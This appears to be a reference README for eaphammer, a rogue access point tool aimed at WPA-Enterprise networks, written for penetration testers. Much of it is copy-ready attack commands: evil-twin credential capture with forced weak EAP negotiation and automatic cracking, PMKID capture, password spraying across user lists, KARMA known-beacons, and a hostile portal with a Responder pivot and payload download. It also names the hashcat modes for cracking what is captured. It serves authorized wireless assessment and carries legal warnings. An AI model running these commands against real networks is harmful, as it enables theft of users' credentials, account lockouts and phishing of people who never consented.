# eaphammer — 802.1X/EAP Evil Twin and credential capture

- **Version:** eaphammer 1.14.1 "Final Frontier"
- **Binary:** `/usr/local/bin/eaphammer` → `/opt/eaphammer/eaphammer`
- **Help snapshot:** [`help.txt`](help.txt)
- **Upstream:** https://github.com/s0lst1c3/eaphammer

> **Deep-research scenarios:** [`SCENARIOS.md`](SCENARIOS.md)

## What it does

eaphammer builds a rogue access point aimed at WPA-Enterprise (802.1X)
networks. It runs a RADIUS server, negotiates an EAP method with the supplicant,
and captures the MSCHAPv2 challenge-response for offline cracking. It also
provides PMKID capture, EAP password spraying, hostile portals, captive
portals, KARMA/known-beacons, and certificate management.

## Use cases

| Situation | Why eaphammer |
|-----------|---------------|
| WPA-Enterprise assessment | Capture EAP credentials with an evil twin |
| PEAP-MSCHAPv2 exposure | Harvest challenge-response for cracking |
| EAP method downgrade | Force GTC or weaker negotiation |
| WPS/PSK network | Clientless PMKID attack via hcxtools |
| Credential reuse check | Spray one password across user lists |
| Captive-portal phishing | Hostile portal with optional payload |

## Requirements & install layout

- **Root**; AP-capable adapter with monitor mode for some modes.
- Git install at `/opt/eaphammer`; wrapper in `/usr/local/bin`.
- Needs `hostapd`, `dnsmasq`, and Python dependencies inside its venv.
- Certificates are managed by the built-in Cert Wizard; run `--bootstrap`
  first for a self-signed set.
- Default AP IP `--lhost`; default channel 1.

## Basic syntax

```bash
# one-time: create a self-signed certificate set
sudo eaphammer --cert-wizard create --self-signed

# evil twin creds capture against a WPA-Enterprise ESSID
sudo eaphammer -i wlan1 -e "CorpNet" --auth wpa-eap --creds

# clientless PMKID attack
sudo eaphammer -i wlan1 -e "HomeNet" --pmkid

# EAP password spray
sudo eaphammer -i wlan1 -e "CorpNet" --eap-spray \
  --user-list users.txt --password 'Summer2026!'
```

## Flag reference

### Modes
| Flag | Meaning |
|------|---------|
| `--cert-wizard [create\|import\|interactive\|list\|dh]` | Certificate management |
| `--list-templates` | List captive-portal templates |
| `--create-template` / `--delete-template` | Manage portal templates |
| `--bootstrap` | Shorthand for `--cert-wizard create --self-signed` |
| `--creds, --brad` | Harvest EAP credentials via evil twin |
| `--pmkid` | Clientless PMKID attack (uses hcxtools) |
| `--eap-spray` | Spray one password across usernames |
| `--hostile-portal` | Force clients to a hostile portal |
| `--captive-portal` | Force clients to a captive portal |
| `--captive-portal-server-only` | Run only the portal server |
| `--debug` | Debug output |

### Access point
| Flag | Meaning |
|------|---------|
| `--lhost <ip>` | AP IP address |
| `-i, --interface <iface>` | PHY interface for the AP |
| `-e, --essid <ssid>` | AP ESSID |
| `-b, --bssid <mac>` | AP BSSID |
| `-c, --channel <n>` | Channel (default 1) |
| `--hw-mode <mode>` | Hardware mode (`g`, `a`, `n`) |
| `--cloaking {none,full,zeroes}` | SSID cloaking behaviour |
| `--auth {open,wpa-psk,wpa-eap,owe,owe-transition,owe-psk}` | Authentication mechanism |
| `--pmf {disable,enable,require}` | Protected Management Frames |
| `--karma, --mana` | Enable KARMA |
| `--essid-stripping {\r,\n,\t,\x20}` | ESSID stripping |
| `--mac-whitelist <file>` / `--mac-blacklist <file>` | MAC filtering |
| `--ssid-whitelist <file>` / `--ssid-blacklist <file>` | SSID filtering |

### KARMA
| Flag | Meaning |
|------|---------|
| `--loud, --singe` | Loud KARMA mode |
| `--known-beacons` | Persistent known-beacons attack |
| `--known-ssids-file <file>` | Wordlist for known beacons |
| `--known-ssids <ssid...>` | SSIDs on the command line |

### WPA-PSK / WPA
| Flag | Meaning |
|------|---------|
| `--channel-width <MHz>` | 20 or 40 MHz (802.11n) |
| `--wpa-passphrase <psk>` | WPA passphrase for the AP |
| `--capture-wpa-handshakes {yes,no}` | Capture 4-way handshakes |
| `--psk-capture-file <file>` | Handshake output path |
| `--auth-alg {shared,open,both}` | Authentication algorithm |
| `--wpa-version {1,2}` | WPA version |

### OWE transition
| Flag | Meaning |
|------|---------|
| `--transition-bssid <mac>` | BSSID of the open transition AP |
| `--transition-ssid <ssid>` | SSID of the open transition AP |

### EAP and autocrack
| Flag | Meaning |
|------|---------|
| `--autocrack` | Automatically crack captured hashes |
| `--negotiate {balanced,speed,weakest,gtc-downgrade,manual}` | EAP negotiation strategy |
| `--wordlist <file>` | Wordlist for autocrack |
| `--remote-cracking-rig <server:port>` | Remote cracking rig |

### Portal and payload
| Flag | Meaning |
|------|---------|
| `--lport <port>` | Captive-portal port |
| `--payload <name>` | Payload name (default `payload.msi`) |
| `--portal-template <dir>` | Template directory |
| `--pivot` | Run Responder without the SMB server |
| `--add-download-form` | Add a download form |
| `--dl-form-message <text>` | Download form text |
| `--name/--description/--author` | Template metadata |

### EAP spray
| Flag | Meaning |
|------|---------|
| `-I, --interface-pool <iface...>` | Interfaces for spraying |
| `--user-list <file>` | Username list |
| `--password <pass>` | Password to spray |

## Recipes

```bash
# 1. Bootstrap certificates
sudo eaphammer --bootstrap

# 2. List certificate configurations
sudo eaphammer --cert-wizard list

# 3. PEAP evil twin against a corporate SSID
sudo eaphammer -i wlan1 -e "CorpNet" --auth wpa-eap --creds \
  --negotiate weakest --autocrack --wordlist /usr/share/wordlists/rockyou.txt

# 4. PMKID against a PSK network
sudo eaphammer -i wlan1 -e "HomeNet" --pmkid --psk-capture-file pmkid.pcapng

# 5. Known-beacons KARMA
sudo eaphammer -i wlan1 --karma --known-beacons --known-ssids-file ssids.txt

# 6. Hostile portal with Responder pivot
sudo eaphammer -i wlan1 -e "Guest" --hostile-portal --pivot

# 7. Portal template from a cloned login page
sudo eaphammer --create-template --name corp-login --author tester

# 8. EAP spray
sudo eaphammer -i wlan1 -e "CorpNet" --eap-spray -I wlan1 wlan2 \
  --user-list users.txt --password 'Winter2026!'
```

## Output & pipelines

- Captured EAP creds → `asleap`/`hashcat -m 5500` (MSCHAPv2) or John.
- `--autocrack` drives cracking automatically.
- PMKID output → `hcxpcapngtool` → hashcat `-m 22000`.
- Handshakes → `hcxtools`; portal captures → engagement evidence.

## Gotchas & operational security

- **Root required**; non-root runs fail when writing logs/config.
- Certs must exist before `--creds`; run `--bootstrap` once.
- Deauth/KARMA/hostile portal transmit frames — authorization required.
- Modern supplicants validate the RADIUS certificate; a self-signed cert may
  be rejected unless the client is misconfigured.
- `--negotiate gtc-downgrade` only works when the client allows GTC.
- EAP spray can lock accounts; check the lockout policy first.
- The wrapper logs to `/opt/eaphammer`; ensure the working directory is
  writable when running as root.

## Legal & safety

Evil-twin and credential-capture activity is illegal without written
authorization. Use an isolated lab or signed engagement scope. Captured
credentials are highly sensitive; encrypt and destroy per policy.

## Related tools

- [`wifiphisher/`](../wifiphisher/README.md) — rogue AP phishing
- [`hcxdumptool/`](../hcxdumptool/README.md), [`hcxtools/`](../hcxtools/README.md)
- [`kismet/`](../kismet/README.md), [`bully/`](../bully/README.md)
- [`gophish/`](../gophish/README.md) — email phishing

## References

- https://github.com/s0lst1c3/eaphammer
- https://github.com/s0lst1c3/eaphammer/wiki
